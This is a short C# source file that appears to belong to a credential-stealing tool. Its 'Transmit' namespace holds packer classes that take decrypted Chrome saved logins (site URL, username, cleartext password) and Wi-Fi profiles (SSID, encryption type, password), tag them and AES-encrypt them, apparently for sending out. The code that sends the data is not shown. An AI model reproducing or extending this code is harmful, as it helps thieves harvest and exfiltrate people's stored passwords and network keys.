namespace PS03.Transmit
{
    public abstract class Packer
    {
        private readonly SimpleAES enc = new SimpleAES();

        protected string Encrypt(string data)
        {
            return enc.EncryptToString(data);
        }
    }

    public class ChromePacker : Packer
    {
        public string Pack(ChromeDecrypt.CPProfile profile)
        {
            string toencrypt = "CHROME:";
            if (!string.IsNullOrWhiteSpace(profile.ActionURL))
                toencrypt += ("ACTION=" + profile.ActionURL);
            else toencrypt += ("ACTION=EMPTY");

            if (!string.IsNullOrWhiteSpace(profile.Username))
                toencrypt += ("USER=" + profile.Username);
            else toencrypt += "USER=EMPTY";

            if (!string.IsNullOrWhiteSpace(profile.ClearPass))
                toencrypt += ("PASS=" + profile.ClearPass);
            else toencrypt += "PASS=EMPTY";

            return Encrypt(toencrypt);
        }
    }

    public class WifiPacker : Packer
    {
        public string Pack(WiPS.Modles.Profile profile)
        {
            string toencrypt = "WIFI:";
            if (!string.IsNullOrWhiteSpace(profile.SSID))
                toencrypt += ("SSID=" + profile.SSID);
            else toencrypt += "SSID=EMPTY";
            if (!string.IsNullOrWhiteSpace(profile.Encryption))
                toencrypt += ("ENC=" + profile.Encryption);
            else toencrypt += "ENC=EMPTY";
            if (!string.IsNullOrWhiteSpace(profile.Password))
                toencrypt += ("PASS=" + profile.Password);
            else toencrypt += "PASS=EMPTY";
            return Encrypt(toencrypt);

        }
    }
}